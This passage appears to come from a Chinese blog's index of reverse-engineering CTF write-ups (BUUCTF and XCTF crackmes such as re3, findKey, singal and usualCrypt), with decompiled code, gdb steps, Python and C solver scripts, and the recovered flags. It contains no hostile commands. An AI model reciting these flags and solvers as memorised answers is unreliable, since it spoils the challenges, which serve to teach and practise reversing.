flag，但是并不能直接找到，我们先看一下 authenticate 函数的汇编代码 12345678910111213141516171819202122232425262728293031.text:08048708 push ebp.text:08048709 mov ebp, esp.text:0804870B sub esp, 8028h.text:08048711 mov dword ptr [esp+4], offset dword_8048A90 ; wchar_t *.text:08048719 mov dword ptr [esp], offset s ; s.text:08048720 call decrypt.text:08048725 mov [ebp+s2], eax.text:08048728 mov eax, ds:stdin@@GLIBC_2_0.text:0804872D mov [esp+8], eax ; stream.text:08048731 mov dword ptr [esp+4], 2000h ; n.text:08048739 lea eax, [ebp+ws].text:0804873F mov [esp], eax ; ws.text:08048742 call _fgetws.text:08048747 test eax, eax.text:08048749 jz short loc_804879C.text:0804874B lea eax, [ebp+ws].text:08048751 mov [esp], eax ; s.text:08048754 call _wcslen.text:08048759 sub eax, 1.text:0804875C mov [ebp+eax*4+ws], 0.text:08048767 mov eax, [ebp+s2].text:0804876A mov [esp+4], eax ; s2.text:0804876E lea eax, [ebp+ws].text:08048774 mov [esp], eax ; s1.text:08048777 call _wcscmp.text:0804877C test eax, eax.text:0804877E jnz short loc_804878F.text:08048780 mov eax, offset unk_8048B44.text:08048785 mov [esp], eax.text:08048788 call _wprintf.text:0804878D jmp short loc_804879C 看到 6、7 行我们可以知道，我们的 s2 字符串在调用 decrypt 函数的时候杯传入了 eax 寄存器中，如果我们可以获取 eax 中的值就可以直接得到 flag 了，而这里我们需要用到 gdb 调试 # gdb 调试 首先用 gdb 打开文件 1gdb 1 (也可以加一个-q界面会更简洁) 然后在 decrypt 函数处设置断点 1b decrypt // (breakpoint) 再执行到断点处 1r // (run) 单步执行 decrypt 1n // (Step Over) 显示寄存器 1i r // (Info register) 最后就可以查看 eax 中的数据了 1x/6sw $eax 其中 6：显示六行数据 s：字符串形式 w：word（4 字节）形式 得到 flag：9447{you_are_an_international_mystery} 题目来源：攻防世界 (xctf.org.cn)——no-strings-attached","tags":["reverse"],"categories":["wp"]},{"title":"re3","path":"/2022/05/09/re3/","content":"这是一个 64 位 ELF 文件，在 Linux 中打开了一下没什么提示，随便输入几个字符提示 wrong，还是用 ida 打开它吧，打开之后直接看到主函数 其中有一个 for 循环进行了很多轮异或运算，而这个 sub_402219 函数正是参与运算的值，而且在后面它又作为函数单独出现，但是它又打不开，在汇编代码中可以找到这个函数的地址，发现这里有一大堆数据，所以我们需要把这一段数据给还原 我们选中 402219 的地址段，按 D 将其转化为数据，然后再通过 idc 脚本将其还原，脚本如下 然后选择数据之后按 C 分析数据，点击 force 强制执行，再将其转化为函数就可以了，这样之后我们的 sub_402219 函数就正常了，就可以正常打开了 在打开之前我们先用 findcrypt 看一下有哪些加密 有 md5 和 AES 两种加密，我们再看看 sub_402219 函数 # sub_402219 函数 12345678910111213141516171819__int64 __fastcall sub_402219(__int64 a1)&#123; unsigned int v2; // [rsp+18h] [rbp-D8h] int i; // [rsp+1Ch] [rbp-D4h] char v4[200]; // [rsp+20h] [rbp-D0h] BYREF unsigned __int64 v5; // [rsp+E8h] [rbp-8h] v5 = __readfsqword(0x28u); sub_400A71(v4, &amp;unk_603170); sub_40196E(v4, a1); sub_40196E(v4, a1 + 16); v2 = 1; for ( i = 0; i &lt;= 31; ++i ) &#123; if ( *(i + a1) != byte_6030A0[i] ) v2 = 0; &#125; return v2;&#125; 可以看到三个关键函数，第一个函数应用了刚刚在主函数中可以看到的 &amp; unk_603170 这一组数据，但我们不知道，可以在后面的调试中获取 在进行三轮加密之后，与 byte_6030A0 数组进行对比，byte_6030A0 数组的数据如下 12340xBC, 0x0A, 0xAD, 0xC0, 0x14, 0x7C, 0x5E, 0xCC, 0xE0, 0xB1, 0x40, 0xBC, 0x9C, 0x51, 0xD5, 0x2B, 0x46, 0xB2, 0xB9, 0x43, 0x4D, 0xE5, 0x32, 0x4B, 0xAD, 0x7F, 0xB4, 0xB3, 0x9C, 0xDB, 0x4B, 0x5B 而这段加密是 AES 加密（小声 bb：我还没有学），不过通过刚才的 findcrypt 可以分析出来这里是 AES 加密，第一个函数就是生成轮密钥，而且那个未知数组是初始密钥，第二个和第三个函数分别是对输入字符串的前后 16 位进行 AES 加密 # sub_40207B 函数 12345678910111213141516unsigned __int64 __fastcall sub_40207B(__int64 a1)&#123; char v2[16]; // [rsp+10h] [rbp-50h] BYREF __int64 v3; // [rsp+20h] [rbp-40h] BYREF __int64 v4; // [rsp+30h] [rbp-30h] BYREF __int64 v5; // [rsp+40h] [rbp-20h] BYREF unsigned __int64 v6; // [rsp+58h] [rbp-8h] v6 = __readfsqword(0x28u); sub_401CF9(&amp;BASE64_table_603120, 0x40uLL, v2); sub_401CF9(&amp;unk_603100, 0x14uLL, &amp;v3); sub_401CF9(&amp;Prime_Constants_char_6030C0, 0x35uLL, &amp;v4); sub_401CF9(MD5_Constants_4025C0, 0x100uLL, &amp;v5); sub_401CF9(v2, 0x40uLL, a1); return __readfsqword(0x28u) ^ v6;&#125; 在这个函数中，sub_401CF9 函数将 base64 表传入，并进行了加密 可以识别出这是 MD5 加密，在加密之后，被储存在 v2 中，之后又在 14 行进行了一次 MD5 加密后储存在 a1，也就是我们要找到的 &amp; unk_603170 数组中 # 总体思路 在第一个函数中将 base64 表进行了两次 MD5 加密，然后以其作为第二个函数中的 AES 加密的初始密钥，在进行 AES 加密，加密后的结果已经储存在 byte_6030A0 数组中且是可见的，而密钥是可以通过调试获取的，但因为这道题它是一个 ELF 文件，在 windows 是无法调试的，所以只能通过 Linux 进行远程调试，获取数据之后，用脚本进行 AES 解密就可以得到 flag # 远程调试 我用的 Linux 系统是 kali，第一次调试，先要把 linux_server 文件放到 kali 里面，然后再直接把文件放到 kali 的桌面上，然后复制一下它的文件位置，然后我们在桌面打开 kali 的终端，并且打开 Linux_server64 文件，之后回到 windows 的 ida 中，选择 debugger 为 remote Linux debugger，之后输入文件在 kali 中位置和虚拟机的 ip 即可开始调试了 这里有一个点要注意，就是我们如果在函数的开始部分就下断点，然后通过输入一个 32 长度的字符串的话，是无法绕过 if 的判断的，还是会退出程序，所以我们就在又在 if 判断的前后分别下一个断点，在运行到 if 之前的断点的时候再 ctrl+F7 跳过到下一个断点，通过这个方式来绕过，绕过之后再单步调试到 &amp; unk_603170 所在函数，然后再进入汇编代码段获取数据就可以获取到它的数据了 # 脚本 在知道了密钥之后和最终密文之后，就是通过脚本进行 AES 解密获取明文 flag 了，我还不会 AES 所以就参照了大佬的脚本，不过不知道为什么我运行不了这个脚本，不过有的别的脚本可以运行，这里我就把两个脚本都放在这吧 123456from Crypto.Cipher import AESimport codecsaes = AES.new(decode_hex(&#x27;CB8D493521B47A4CC1AE7E62229266CE&#x27;)[0], AES.MODE_ECB)print(aes.decrypt(decode_hex(&#x27;BC0AADC0147C5ECCE0B140BC9C51D52B46B2B9434DE5324BAD7FB4B39CDB4B5B&#x27;)[0])) 123456789from Crypto.Cipher import AESfrom binascii import b2a_hex, a2b_hexmode = AES.MODE_ECBkey = b&#x27;\\xcb\\x8d\\x49\\x35\\x21\\xb4\\x7a\\x4c\\xc1\\xae\\x7e\\x62\\x22\\x92\\x66\\xce&#x27;text = b&#x27;\\xBC\\x0A\\xAD\\xC0\\x14\\x7C\\x5E\\xCC\\xE0\\xB1\\x40\\xBC\\x9C\\x51\\xD5\\x2B\\x46\\xB2\\xB9\\x43\\x4D\\xE5\\x32\\x4B\\xAD\\x7F\\xB4\\xB3\\x9C\\xDB\\x4B\\x5B&#x27;cryptos = AES.new(key, mode)cipher_text = cryptos.decrypt(text)print(b2a_hex(cipher_text)) 注意一下第二个脚本得到的数据还要十六进制转 ASCII 一下 最后得到 flag {924a9ab2163d390410d0a1f670} 题目来源：BUUCTF 在线评测 (buuoj.cn)——re3","tags":["reverse"],"categories":["wp"]},{"title":"2019红帽杯easyRE","path":"/2022/05/07/2019红帽杯easyRE/","content":"这道题是个 elf 文件，在 Linux 环境中打开之后发现什么提示都没有，随便输入一串字符也没提示就直接退出了，于是就还是用 ida pro 打开，发现没有主函数的窗口，那就检索字符串吧，看到这么一大堆字符串 然后交叉引用一下进入到该字符串所在的函数，这应该就是关键函数了，发现这里有十个一样的函数 就发现这是 base64，而且进行了十次，进行十次之后的结果就是刚才那一大堆字符串，然后把它解码十次之后，就… 就得到了一个网站 https://bbs.pediy.com/thread-254172.htm，然后进去这个网站之后，根本就没有 flag 说明我们思路不对，所以我就返回去看主函数，看到这一部分 这里将三个字符串拼到一起，然后还在 v [12] 和 v [13] 的末端加了一个 127，然后再进行一次异或运算，写了个脚本得到了 Info:The first four chars are `flag`，这应该是一个提示，然后在这里呆了半天也不知道下一步该怎么做，看了大佬的题解提示，在进行完上面的异或和 base 循环之后，下面又调用了 sub_400D35 这个函数 我们看看这个函数 关键部分就是一个 if 条件语句和一个 for 循环了，if 的括号中的条件，是 v4 和一个已知数组的异或 1[0x40, 0x35, 0x20, 0x56, 0x5D, 0x18, 0x22, 0x45, 0x17, 0x2F, 0x24, 0x6E, 0x62, 0x3C, 0x27, 0x54, 0x48, 0x6C, 0x24, 0x6E, 0x72, 0x3C, 0x32, 0x45, 0x5B] 也容易看出前四位的异或结果应该就是 flag 了，然后在下面的 for 循环中再和 v4 进行异或，要知道 v4 我们就再进行一次异或就可以得到，然后就可以进行 for 循环中的异或了，异或之后的结果应该就是 flag 了，毕竟前四个结果就是 flag 嘛，脚本如下 123456789101112131415161718192021a = [73, 111, 100, 108, 62, 81, 110, 98, 40, 111, 99, 121, 127, 121, 46, 105, 127, 100, 96, 51, 119, 125, 119, 101, 107, 57, 123, 105, 121, 61, 126, 121, 76, 64, 69, 67]for i in range(len(a)): a[i] = chr(a[i] ^ i) print(a[i], end=&#x27;&#x27;)print()b = [0x40, 0x35, 0x20, 0x56, 0x5D, 0x18, 0x22, 0x45, 0x17, 0x2F, 0x24, 0x6E, 0x62, 0x3C, 0x27, 0x54, 0x48, 0x6C, 0x24, 0x6E, 0x72, 0x3C, 0x32, 0x45, 0x5B]c = &#x27;flag&#x27;v1 = &#x27;&#x27;flag = &#x27;&#x27;for i in range(len(c)): v1 += chr(b[i] ^ ord(c[i]))print(v1)for i in range(len(b)): flag += chr(b[i] ^ ord(v1[i % 4]))print(flag) 得到 flag {Act1ve_Defen5e_Test} 题目来源：BUUCTF 在线评测 (buuoj.cn)——[2019 红帽杯] easyRE","tags":["reverse"],"categories":["wp"]},{"title":"羊城杯2020easyre","path":"/2022/05/05/羊城杯2020easyre/","content":"# 主函数 思路很好理解，将输入的 flag 进行三次 encode 然后和 Str2 对比，一致则正确，我们分别看一下三个 encode 的作用 # encode_one 在 encode_one 中有一个 alphabet，其实就是编码表，很明显就是 base64 哈哈哈，所以这一个函数的作用就是给输入的 flag 进行一次 base64 编码 # encode_two 这一步是将 base64 编码后的 flag 进行一次分组，strncpy 函数的作用，以第一个为例，是将编码后的 flag 的 26 位开始数 13 个复制到 a3，也就是 26 到 39，以此类推就是 0-13，39-52，13-26 # encode_three 这一步是将分组完后的 flag 在进行一次算法加密，其实这就是凯撒加密，但比凯撒多了一步即 0-9 几个数字也进行了变化，48-57 就是 0-9 的 ASCII 码 # 总体思路 程序将我们输入的 flag 进行一次 base64 编码后，再 13 个 13 个为一组进行一次调换，然后在进行一次特殊的凯撒加密，最后在与 Str2 进行对比，Str2 就是进行了 3 次加密过后的结果，理清楚思路之后，我们反着来写个脚本就可以得到最初的 flag 了～ # 脚本 12345678910111213141516import base64a = &quot;EmBmP5Pmn7QcPU4gLYKv5QcMmB3PWHcP5YkPq3=cT6QckkPckoRG&quot;flag = &#x27;&#x27;for i in range(len(a)): if ord(a[i]) &gt; 47 and ord(a[i]) &lt;= 57: flag += chr((ord(a[i]) - 48 - 3) % 10 + 48) # 数字也要减三 elif ord(a[i]) &gt; 96 and ord(a[i]) &lt;= 122: flag += chr((ord(a[i]) - 97 - 3) % 26 + 97) elif ord(a[i]) &gt; 64 and ord(a[i]) &lt;= 90: flag += chr((ord(a[i]) - 65 - 3) % 26 + 65) else: flag += a[i]print(flag)flag = flag[13:26] + flag[39:] + flag[:13] + flag[26:39]print(base64.b64decode(flag)) 得到 flag：GWHT{672cc4778a38e80cb362987341133ea2} 题目来源：BUUCTF 在线评测 (buuoj.cn)——[羊城杯 2020] easyre","tags":["reverse"],"categories":["wp"]},{"title":"findkey","path":"/2022/05/01/findkey/","content":"这是一个 32 位的程序，点开之后啥都没有，就是一个空的界面 然后用 idapro 打开它之后，发现主函数中也没有什么有用的东西 所以我就 shift+F12 查看一下字符串，发现有几个可以字符串 双击进去交叉引用一下，可以看到 但是这里无法 F5 查看伪代码，所以我们把红色的全部选中并将它转为函数即可，转为函数后我们就可以来分析了 # main 函数 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118LRESULT __stdcall sub_401640(HWND hWndParent, UINT Msg, WPARAM wParam, LPARAM lParam)&#123; int v5; // eax size_t v6; // eax DWORD v7; // eax int v8; // eax int v9; // eax int v10; // [esp+4Ch] [ebp-400h] UINT v11; // [esp+50h] [ebp-3FCh] CHAR v12[256]; // [esp+54h] [ebp-3F8h] BYREF char v13[7]; // [esp+154h] [ebp-2F8h] BYREF __int16 v14; // [esp+15Bh] [ebp-2F1h] char v15; // [esp+15Dh] [ebp-2EFh] char Str[33]; // [esp+160h] [ebp-2ECh] BYREF char v17[220]; // [esp+181h] [ebp-2CBh] BYREF __int16 v18; // [esp+25Dh] [ebp-1EFh] char v19; // [esp+25Fh] [ebp-1EDh] CHAR v20[256]; // [esp+260h] [ebp-1ECh] BYREF CHAR String[4]; // [esp+360h] [ebp-ECh] BYREF int v22; // [esp+364h] [ebp-E8h] __int16 v23; // [esp+368h] [ebp-E4h] CHAR Text[32]; // [esp+36Ch] [ebp-E0h] BYREF struct tagRECT Rect; // [esp+38Ch] [ebp-C0h] BYREF CHAR Buffer[100]; // [esp+39Ch] [ebp-B0h] BYREF HDC hdc; // [esp+400h] [ebp-4Ch] struct tagPAINTSTRUCT Paint; // [esp+404h] [ebp-48h] BYREF int v29; // [esp+444h] [ebp-8h] int v30; // [esp+448h] [ebp-4h] LoadStringA(hInstance, 0x6Au, Buffer, 100); v11 = Msg; if ( Msg &gt; 0x111 ) &#123; if ( v11 == 517 ) &#123; if ( strlen((const char *)String1) &gt; 6 ) ExitProcess(0); if ( strlen((const char *)String1) ) &#123; memset(v20, 0, sizeof(v20)); v6 = strlen((const char *)String1); memcpy(v20, String1, v6); v7 = strlen((const char *)String1); sub_40101E(String1, v7, (LPSTR)String1); strcpy(Str, &quot;0kk`d1a`55k222k2a776jbfgd`06cjjb&quot;); memset(v17, 0, sizeof(v17)); v18 = 0; v19 = 0; strcpy(v13, &quot;SS&quot;); *(_DWORD *)&amp;v13[3] = 0; v14 = 0; v15 = 0; v8 = strlen(Str); sub_401005(v13, (int)Str, v8); if ( _strcmpi((const char *)String1, Str) ) &#123; SetWindowTextA(hWndParent, &quot;flag&#123;&#125;&quot;); MessageBoxA(hWndParent, &quot;Are you kidding me?&quot;, &quot;^_^&quot;, 0); ExitProcess(0); &#125; memcpy(v12, &amp;unk_423030, 0x32u); v9 = strlen(v12); sub_401005(v20, (int)v12, v9); MessageBoxA(hWndParent, v12, 0, 0x32u); &#125; ++dword_428D54; &#125; else &#123; if ( v11 != 520 ) return DefWindowProcA(hWndParent, Msg, wParam, lParam); if ( dword_428D54 == 16 ) &#123; strcpy(String, &quot;ctf&quot;); v22 = 0; v23 = 0; SetWindowTextA(hWndParent, String); strcpy(Text, &quot;Are you kidding me?&quot;); MessageBoxA(hWndParent, Text, Buffer, 0); &#125; ++dword_428D54; &#125; &#125; else &#123; switch ( v11 ) &#123; case 0x111u: v30 = (unsigned __int16)wParam; v29 = HIWORD(wParam); v10 = (unsigned __int16)wParam; if ( (unsigned __int16)wParam == 104 ) &#123; DialogBoxParamA(hInstance, (LPCSTR)0x67, hWndParent, (DLGPROC)DialogFunc, 0); &#125; else &#123; if ( v10 != 105 ) return DefWindowProcA(hWndParent, Msg, wParam, lParam); DestroyWindow(hWndParent); &#125; break; case 2u: PostQuitMessage(0); break; case 0xFu: hdc = BeginPaint(hWndParent, &amp;Paint); GetClientRect(hWndParent, &amp;Rect); v5 = strlen(Buffer); DrawTextA(hdc, Buffer, v5, &amp;Rect, 1u); EndPaint(hWndParent, &amp;Paint); break; default: return DefWindowProcA(hWndParent, Msg, wParam, lParam); &#125; &#125; return 0;&#125; 其中有两个关键函数 sub_40101E，sub_401005，并且 sub_401005 函数进行了两次，那么我们的 flag 就是第二个 MessageBoxA 输出的 # sub_40101E 这个函数百度之后知道是进行 hash 加密，但还不确定是那种类型的 hash # sub_401005 12345678910111213141516unsigned int __cdecl sub_401590(LPCSTR lpString, int a2, int a3)&#123; unsigned int result; // eax unsigned int i; // [esp+4Ch] [ebp-Ch] unsigned int v5; // [esp+54h] [ebp-4h] v5 = lstrlenA(lpString); for ( i = 0; ; ++i ) &#123; result = i; if ( i &gt;= a3 ) break; *(_BYTE *)(i + a2) ^= lpString[i % v5]; &#125; return result;&#125; 一个很简单的异或，其中 a2 是字符串 &quot;0kk`d1a`55k222k2a776jbfgd`06cjjb&quot;，a3 是 “SS”，第二次异或的 a2 是 &quot;W^RTI_1miF2n_2lW [TL&quot;，而 a3 是 String1，是没有进行过 hash 加密的 String1 # 总体思路 程序将 &quot;0kk`d1a`55k222k2a776jbfgd`06cjjb&quot; 和 SS 字符串进行一次异或，异或之后要将它与 hash 后的 string1 进行对比，在确定 hash 加密类型后我们就可以得到 String1 在 hash 加密之前的原码了，根据第二次 sub_401005 函数传进去的值可以知道，这次异或的 a3 就是 String1，所以我们再进行一次异或就可以得到输出的 flag 了 # 脚本 在第一次异或之后得到了 &quot;c8837b23ff8aaa8a2dde915473ce0991&quot;，通过工具可以确定这是 MD5 加密类型，在网站上在线解密一下，得到 String1 为 &quot;123321&quot;，后面在进行一次异或即可，脚本如下 123456789101112131415161718a = &quot;0kk`d1a`55k222k2a776jbfgd`06cjjb&quot;b = &#x27;SS&#x27;a = list(a)b = list(b)for i in range(len(a)): a[i] = chr(ord(b[i % 2]) ^ ord(a[i])) print(a[i], end=&#x27;&#x27;)print(&#x27;&#x27;)c = [0x57, 0x5E, 0x52, 0x54, 0x49, 0x5F, 0x01, 0x6D, 0x69, 0x46, 0x02, 0x6E, 0x5F, 0x02, 0x6C, 0x57, 0x5B, 0x54, 0x4C]d = &#x27;123321&#x27;d = list(d)for i in range(len(c)): c[i] = chr(ord(d[i % 6]) ^ c[i]) print(c[i], end=&#x27;&#x27;) 最终结果 得到 flag {n0_Zu0_n0_die} 题目来源：BUUCTF 在线评测 (buuoj.cn)——findKey","tags":["reverse"],"categories":["wp"]},{"title":"singal","path":"/2022/04/28/singal/","content":"看主函数这里，可以知道 v4 就是 unk_403040 这个数组，关键部分是 vm_operad 函数并且将 v4 传了进去 # vm_operad 函数 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879int __cdecl vm_operad(int *a1, int a2)&#123; int result; // eax char Str[200]; // [esp+13h] [ebp-E5h] BYREF char v4; // [esp+DBh] [ebp-1Dh] int v5; // [esp+DCh] [ebp-1Ch] int v6; // [esp+E0h] [ebp-18h] int v7; // [esp+E4h] [ebp-14h] int v8; // [esp+E8h] [ebp-10h] int v9; // [esp+ECh] [ebp-Ch] v9 = 0; v8 = 0; v7 = 0; v6 = 0; v5 = 0; while ( 1 ) &#123; result = v9; if ( v9 &gt;= a2 ) return result; switch ( a1[v9] ) &#123; case 1: Str[v6 + 100] = v4; ++v9; ++v6; ++v8; break; case 2: v4 = a1[v9 + 1] + Str[v8]; v9 += 2; break; case 3: v4 = Str[v8] - LOBYTE(a1[v9 + 1]); v9 += 2; break; case 4: v4 = a1[v9 + 1] ^ Str[v8]; v9 += 2; break; case 5: v4 = a1[v9 + 1] * Str[v8]; v9 += 2; break; case 6: ++v9; break; case 7: if ( Str[v7 + 100] != a1[v9 + 1] ) &#123; printf(&quot;what a shame...&quot;); exit(0); &#125; ++v7; v9 += 2; break; case 8: Str[v5] = v4; ++v9; ++v5; break; case 10: read(Str); ++v9; break; case 11: v4 = Str[v8] - 1; ++v9; break; case 12: v4 = Str[v8] + 1; ++v9; break; default: continue; &#125; &#125;&#125; 这里 a1 就是 v4 数组，并且以其中的值来确定 case 转到 16 进制窗口，获取一下数据，因为 case 中没有 0 所以 0 可以去掉 1234567890x0A,0x04,0x10,0x08, 0x03,0x05,0x01,0x04, 0x20,0x08,0x05,0x03, 0x01,0x03,0x02,0x08, 0x0B,0x01,0x0C,0x08, 0x04,0x04,0x01,0x05, 0x03,0x08,0x03,0x21, 0x01,0x0B,0x08,0x0B, 0x01,0x04,0x09,0x08, 0x03,0x20,0x01,0x02, 0x51,0x08,0x04,0x24, 0x01,0x0C,0x08,0x0B, 0x01,0x05,0x02,0x08, 0x02,0x25,0x01,0x02, 0x36,0x08,0x04,0x41, 0x01,0x02,0x20,0x08, 0x05,0x01,0x01,0x05, 0x03,0x08,0x02,0x25, 0x01,0x04,0x09,0x08, 0x03,0x20,0x01,0x02, 0x41,0x08,0x0C,0x01, 0x07,0x22,0x07,0x3F, 0x07,0x34,0x07,0x32, 0x07,0x72,0x07,0x33, 0x07,0x18,0x07,0xA7,0xFF,0xFF,0xFF, 0x07,0x31,0x07,0xF1,0xFF,0xFF,0xFF, 0x07,0x28,0x07,0x84,0xFF,0xFF,0xFF, 0x07,0xC1,0xFF,0xFF,0xFF,0x07,0x1E, 0x07,0x7A 第一个数据是 0x0A 也就是 10，看到 case10，点进去之后发现 case10 就是输入 flag 的函数，储存在 Str 中，长度为 15 # case1 1234567case 1: Str[v6 + 100] = v4; ++v9; ++v6; ++v8; break; 在后面的几个 case 中，分别对输入的 flag 进行了一些运算，然后我们通过 case1 来储存计算后的值的下标，即 100-114，15 个数据 # case7 123456789case 7: if ( Str[v7 + 100] != a1[v9 + 1] ) &#123; printf(&quot;what a shame...&quot;); exit(0); &#125; ++v7; v9 += 2; break; 在 a1 数组中我们可以看到最后面有很多的 7，这一段就是对之前的 flag 的计算进行比较，计算后的结果是要等于 a1 数组中 7 后面的数据的，数了一下发现，刚好有 15 个 7，也就是 flag 的长度，刚好和 flag 进行比较，将这 15 个数据单独拿出来 10x22,0x3f,0x34,0x32,0x72,0x33,0x18,0xa7,0x31,0xf1,0x28,0x84,0xc1,0x1e,0x7a # 总体思路 在输入 flag 之后，函数将 flag 的每一位进行一个运算，运算之后通过 case1 来储存计算后的结果，计算并储存完之后再通过 case7 来对比是否等于它已经给出的密文 # 脚本 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104#include &lt;stdlib.h&gt;#include &lt;stdio.h&gt;#include &lt;string.h&gt; int v9 = 0; int v8 = 0; int v7 = 0; int v6 = 0; int v5 = 0; int v4 = 0; int last_v9 = 0,last_v8 = 0,last_v7 = 0,last_v6 = 0 ,last_v5 = 0,last_v4 = 0;int f(int a1[],int k,int v[])&#123; v4 = k; while(1) &#123; switch ( a1[v9] ) &#123; case 1: if(v[v6] == v4) &#123; printf(&quot;k = %d &quot;,k); ++v9; ++v6; ++v8; last_v9 = v9; last_v8 = v8; last_v6 = v6; return 1; &#125; else &#123; v9 = last_v9; //找不到则返回上一个v9 v8 = last_v8; v6 = last_v6; return 0; &#125; break; case 2: v4 = a1[v9 + 1] + v4; v9 += 2; break; case 3: v4 = v4 - a1[v9 + 1]; v9 += 2; break; case 4: v4 = a1[v9 + 1] ^ v4; v9 += 2; break; case 5: v4 = a1[v9 + 1] * v4; v9 += 2; break; case 6: ++v9; break; case 11: v4 = v4 - 1; ++v9; break; case 12: v4 = v4 + 1; ++v9; break; default: v9++; break; &#125; &#125;&#125;int main()&#123; int v[16] = &#123;0x22,0x3f,0x34,0x32,0x72,0x33,0x18,0xa7,0x31,0xf1,0x28,0x84,0xc1,0x1e,0x7a&#125;; int a1[] = &#123;0x04,0x10,0x08,0x03,0x05,0x01,0x04, 0x20,0x08,0x05,0x03, 0x01,0x03,0x02,0x08, 0x0B,0x01,0x0C,0x08, 0x04,0x04,0x01,0x05, 0x03,0x08,0x03,0x21, 0x01,0x0B,0x08,0x0B, 0x01,0x04,0x09,0x08, 0x03,0x20,0x01,0x02, 0x51,0x08,0x04,0x24, 0x01,0x0C,0x08,0x0B, 0x01,0x05,0x02,0x08, 0x02,0x25,0x01,0x02, 0x36,0x08,0x04,0x41, 0x01,0x02,0x20,0x08, 0x05,0x01,0x01,0x05, 0x03,0x08,0x02,0x25, 0x01,0x04,0x09,0x08, 0x03,0x20,0x01,0x02, 0x41,0x08,0x0C,0x01&#125;; int i,j,k = 0; int flag[15] = &#123;0&#125;; for(i = 0 ; i &lt; 15 ; i++) &#123; for(k = 31 ; k &lt;= &#x27;z&#x27;; k ++) //从1到z一个一个试 &#123; if(f(a1,k,v)) &#123; flag[i] = k; break; &#125; &#125; &#125; printf(&quot;flag&#123;&quot;); for(i = 0 ; i &lt; 15 ; i++) &#123; printf(&quot;%c&quot;,flag[i]); &#125; printf(&quot;&#125; &quot;); return 0;&#125; 得到 flag {757515121f3d478} 题目来源：BUUCTF 在线评测 (buuoj.cn)——[网鼎杯 2020 青龙组] singal","tags":["reverse"],"categories":["wp"]},{"title":"usualCrypt","path":"/2022/04/25/usualCrypt/","content":"直接看到主函数 关键函数位 17 行的 sub_401080，我们点进去看看 这个函数又可以分为三个部分，第一个部分是 sub_401000 函数，第三部分是 sub_401030，第二部分就是这中间的部分，我是先点开了 byte_40E0A0 这个数组，点进去一看发现了 base64 的编码表，再回头看第二部分的加密，就可以确定这是 base 编码了 然后再看看第一部分的函数 发现这里对 base64 的编码表做了点手脚，把里面的位置调换了一下 在看第三部分 sub_401030，这个函数将编码后的 flag 的大小写互换了一下 总结一下就是将 flag 用换了表的 base64 编码一下，然后再把大小写互换一下即可，然后我们再找一下密文，密文就是主函数中的 byte_40E0E4 也就是 zMXHz3TIgnxLxJhFAdtZn2fFk3lYCrtPC2l9 先写一个大小写互换和得出新表的脚本吧 12345678910111213141516171819202122232425a = &#x27;zMXHz3TIgnxLxJhFAdtZn2fFk3lYCrtPC2l9&#x27;b = &#x27;&#x27;for i in range(len(a)): if a[i] &gt;= &#x27;A&#x27; and a[i] &lt;= &#x27;Z&#x27;: b += chr(ord(a[i]) + 32) if a[i] &gt;= &#x27;a&#x27; and a[i] &lt;= &#x27;z&#x27;: b += chr(ord(a[i]) - 32) if a[i] &lt;= &#x27;9&#x27; and a[i] &gt;= &#x27;0&#x27;: b += a[i]print(b)v1 = &#x27;&#x27;result = 6part_base64 = &#x27;ABCDEFGHIJKLMNO&#x27; # byte_40E0A0base64 = &#x27;KLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&#x27; # byte_40E0AAbase1 = list(part_base64)base2 = list(base64)for i in range(result, 15): v1 = base2[result] base2[result] = base1[result] base1[result] = v1 result += 1a = &#x27;&#x27;.join(base1 + base2[5:])print(a) 跑出来的结果如下，上面是大小写互换后的密文，下面是新表 最后我们再用一个脚本把新的 base64 编码表放进去，再来解码这个密文就可以得到 flag 啦～ 得到 flag {bAse64_h2s_a_Surprise}","tags":["reverse"],"categories":["wp"]},{"title":"如何patch花指令","path":"/2022/04/17/如何patch花指令/","content":"今天是在做题的过程中遇到一个新的东西，也就是花指令，实在是让我毫无头绪，后面搜了 wp 才知道这个题有个花指令，需要我们把它 patch 掉 其实这道题还是个迷宫题哈哈哈，先不管它是什么题，我们继续 这个程序是一个 32 位的带 upx 壳的程序，脱完壳之后，拖到 ida pro 中查看伪代码，但是我们虽然一点进去就是 main 函数，但是这个函数并没有被 ida 给反汇编，这就是因为花指令 在 main 函数的汇编代码这里我们可以看到，有一个 jnz 指令，这个 jnz 指令就一般是花指令的特征，还有一个 jz 指令也是（其实这里我并没有很懂，我的汇编学的不是很好，到时候还得恶补 T^T），一般这种花指令的后面都会带上一个 call 指令，而这个 call 指令根本就不是一个完整的 call 指令，但是我们的 ida 还是会把它当成一个完整的指令，这就会导致 ida 的反汇编到这里就会出错，那么我们现在就要来解决它 我们先把光标移到这个 call 上，然后点开左上角 Edit 中的 patch program 中的 change byte，然后可以看到下面这个界面 其中的这个 E8 就是汇编语言 call 的机器码，就是供机器识别的代码，而我们需要做的就是把这个 call 指令改为一个空指令，也就是 nop 指令，然后 nop 指令的机器码是 90，所以我们在这里把这个 E8 改为 90 就可以了，改完之后就是下面这样子 我们发现原来的 call 指令没了，取而代之的是一条空指令 nop，这样 ida 就不会反汇编错误了 最后我们选中从 main 函数开头到结尾，然后按 P，就相当于把这个汇编代码反汇编成伪代码，然后我们就可以发现在 Function window 看到我们的 main 函数了，然后点进去按 F5 反汇编，就进入到了我们主函数的伪代码，如下 一道很简单的迷宫题，很容易知道它的方向就是 wasd，然后起点就是 * asc_408078 这一串数据，点进去得知是（7，0），终点就是 if 条件中的（5，-4） 至于迷宫图（strings window 中查看），它一共有 70 个字符，要么是 7×10 就是 10×7 哈哈哈，这里是 7 行 10 列 1234567*******+********* ****** **** ******* **F****** ************** 所以 flag 就为 flag {ssaaasaassdddw} 题目来源：BUUCTF 在线评测 (buuoj.cn)——[HDCTF2019]Maze","tags":["reverse"],"categories":["笔记"]},{"title":"2020华南师大CTF新生赛maze","path":"/2022/04/15/2020华南师大CTF新生赛maze/","content":"又是一道迷宫题，而且又是华南师大的新生赛题哈哈哈哈，这道题比 19 年的要难上不少哈哈哈 依然是 32 位无壳程序，用 ida pro 打开后查看主函数 可以看出它的关键部分依然是 check 函数 我们要做的还是一样的，要找出地图在哪里，正好这个 check 函数下面有一个 map 